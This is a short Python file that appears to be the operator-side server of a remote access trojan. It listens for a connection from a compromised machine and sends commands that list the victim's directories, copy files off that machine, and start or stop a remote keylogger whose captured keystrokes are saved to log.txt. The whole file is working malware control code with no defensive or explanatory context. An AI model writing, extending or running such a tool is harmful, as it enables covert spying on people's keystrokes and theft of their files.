import socket as s
import threading
socket = s.socket()


HOST = ""
PORT = 1234

print(s.gethostname())
socket.bind((HOST, PORT))
socket.listen()
print("waiting")
conn, addr = socket.accept()
print("Connected to " + str(addr))


class key_log:
    def __init__(self, f):
        self.file = f

    def key_log(self):
        while True:
            data = conn.recv(1024).decode().replace("'", "").encode()
            if data:
                try:
                    self.file.write(data)
                except:
                    break
        print('look file')

    def key_log_close(self):
        self.file.close()


while True:
    cmd = input("send message for client: ")
    if cmd == 'view_cwd':
        conn.send(cmd.encode())
        print("command sent")
        data = conn.recv(1024)
        print(data.decode())
    elif cmd == 'dir':
        w_dir = input("enter dir: ")
        conn.send(cmd.encode())
        conn.send(w_dir.encode())
        print("command sent")
        data = conn.recv(1024)
        print(data.decode())
    elif cmd == "download_file":
        fn = input("enter file name: ")
        conn.send(cmd.encode())
        conn.send(fn.encode())
        print("command sent")
        data = conn.recv(1024000)
        fn_downloaded = input("where download: ")
        f = open(fn_downloaded, "wb")
        f.write(data)
        f.close()
    elif cmd == "key_logger":
        conn.send(cmd.encode())
        print("key_logger start")
        logger = key_log(open('log.txt', 'wb'))
        a = threading.Thread(target=logger.key_log)
        a.start()
    elif cmd == "key_logger_close":
        conn.send(cmd.encode())
        logger.key_log_close()
